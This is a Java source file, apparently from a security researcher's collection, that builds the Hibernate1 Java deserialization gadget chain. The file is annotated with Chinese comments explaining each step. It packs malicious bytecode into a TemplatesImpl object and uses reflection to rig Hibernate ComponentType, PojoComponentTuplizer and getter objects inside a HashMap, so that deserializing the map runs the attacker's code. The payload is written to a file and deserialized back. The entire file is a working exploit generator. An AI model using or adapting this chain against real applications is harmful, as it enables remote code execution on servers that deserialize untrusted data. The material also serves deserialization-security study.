package org.su18.serialize.ysoserial.Hibernate.Hibernate1;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.hibernate.engine.spi.TypedValue;
import org.hibernate.type.Type;
import org.su18.serialize.utils.ClassUtil;
import org.su18.serialize.utils.SerializeUtil;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;

/**
 * Hibernate1
 *
 * @author su18
 */
public class Hibernate1 {

	public static void main(String[] args) throws Exception {

		Class<?> componentTypeClass             = Class.forName("org.hibernate.type.ComponentType");
		Class<?> pojoComponentTuplizerClass     = Class.forName("org.hibernate.tuple.component.PojoComponentTuplizer");
		Class<?> abstractComponentTuplizerClass = Class.forName("org.hibernate.tuple.component.AbstractComponentTuplizer");


		// 生成包含恶意类字节码的 TemplatesImpl 类
		TemplatesImpl tmpl   = SerializeUtil.generateTemplatesImpl();
		Method        method = TemplatesImpl.class.getDeclaredMethod("getOutputProperties");

		Object getter;
		try {
			// 创建 GetterMethodImpl 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
			Class<?>       getterImpl  = Class.forName("org.hibernate.property.access.spi.GetterMethodImpl");
			Constructor<?> constructor = getterImpl.getDeclaredConstructors()[0];
			constructor.setAccessible(true);
			getter = constructor.newInstance(null, null, method);
		} catch (Exception ignored) {
			// 创建 BasicGetter 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
			Class<?>       basicGetter = Class.forName("org.hibernate.property.BasicPropertyAccessor$BasicGetter");
			Constructor<?> constructor = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);
			constructor.setAccessible(true);
			getter = constructor.newInstance(tmpl.getClass(), method, "outputProperties");
		}

		// 创建 PojoComponentTuplizer 实例，用来触发 Getter 方法
		Object tuplizer = ClassUtil.createInstanceUnsafely(pojoComponentTuplizerClass);

		// 反射将 BasicGetter 写入 PojoComponentTuplizer 的成员变量 getters 里
		Field field = abstractComponentTuplizerClass.getDeclaredField("getters");
		field.setAccessible(true);
		Object getters = Array.newInstance(getter.getClass(), 1);
		Array.set(getters, 0, getter);
		field.set(tuplizer, getters);

		// 创建 ComponentType 实例，用来触发 PojoComponentTuplizer 的 getPropertyValues 方法
		Object type = ClassUtil.createInstanceUnsafely(componentTypeClass);

		// 反射将相关值写入，满足 ComponentType 的 getHashCode 调用所需条件
		Field field1 = componentTypeClass.getDeclaredField("componentTuplizer");
		field1.setAccessible(true);
		field1.set(type, tuplizer);

		Field field2 = componentTypeClass.getDeclaredField("propertySpan");
		field2.setAccessible(true);
		field2.set(type, 1);

		Field field3 = componentTypeClass.getDeclaredField("propertyTypes");
		field3.setAccessible(true);
		field3.set(type, new Type[]{(Type) type});

		// 创建 TypedValue 实例，用来触发 ComponentType 的 getHashCode 方法
		TypedValue typedValue = new TypedValue((Type) type, null);

		// 创建反序列化用 HashMap
		HashMap<Object, Object> hashMap = new HashMap<>();
		hashMap.put(typedValue, "su18");

		// put 到 hashmap 之后再反射写入，防止 put 时触发
		Field valueField = TypedValue.class.getDeclaredField("value");
		valueField.setAccessible(true);
		valueField.set(typedValue, tmpl);

		SerializeUtil.writeObjectToFile(hashMap);
		SerializeUtil.readFileObject();
	}

}
